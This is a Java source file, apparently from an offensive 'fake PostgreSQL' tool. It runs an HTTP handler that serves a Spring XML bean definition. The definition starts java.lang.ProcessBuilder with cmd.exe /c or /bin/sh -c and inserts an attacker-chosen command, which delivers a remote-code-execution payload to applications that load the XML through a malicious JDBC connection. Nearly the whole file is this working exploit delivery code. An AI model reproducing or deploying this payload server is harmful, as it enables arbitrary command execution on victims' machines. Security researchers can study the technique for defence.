package me.n1ar4.fake.pgsql;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;

import java.io.IOException;
import java.io.OutputStream;

public class XmlHandler implements HttpHandler {
    private static final String winPayload = "<beans xmlns=\"http://www.springframework.org/schema/beans\" " +
            "xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xsi:schemaLocation=\"http://www.springframework.org/schema/beans " +
            "http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
            "    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
            "        <constructor-arg>\n" +
            "            <list>\n" +
            "                <value>cmd.exe</value>\n" +
            "                <value>/c</value>\n" +
            "                <value>__cmd__</value>\n" +
            "            </list>\n" +
            "        </constructor-arg>\n" +
            "    </bean>\n" +
            "</beans>";
    private static final String linuxPayload = "<beans xmlns=\"http://www.springframework.org/schema/beans\" " +
            "xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xsi:schemaLocation=\"http://www.springframework.org/schema/beans " +
            "http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
            "    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
            "        <constructor-arg>\n" +
            "            <list>\n" +
            "                <value>/bin/sh</value>\n" +
            "                <value>-c</value>\n" +
            "                <value>__cmd__</value>\n" +
            "            </list>\n" +
            "        </constructor-arg>\n" +
            "    </bean>\n" +
            "</beans>";

    private static String command;
    private static String payload;

    public XmlHandler(String targetOS, String cmd) {
        command = cmd;
        if (targetOS.toLowerCase().contains("windows")) {
            payload = winPayload;
        } else {
            payload = linuxPayload;
        }
    }

    @Override
    public void handle(HttpExchange exchange) throws IOException {
        exchange.getResponseHeaders().set("Content-Type", "application/xml");
        exchange.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
        exchange.sendResponseHeaders(200, 0);
        String xml = payload.replaceAll("__cmd__", command);
        OutputStream responseBody = exchange.getResponseBody();
        responseBody.write(xml.getBytes());
        responseBody.close();
    }
}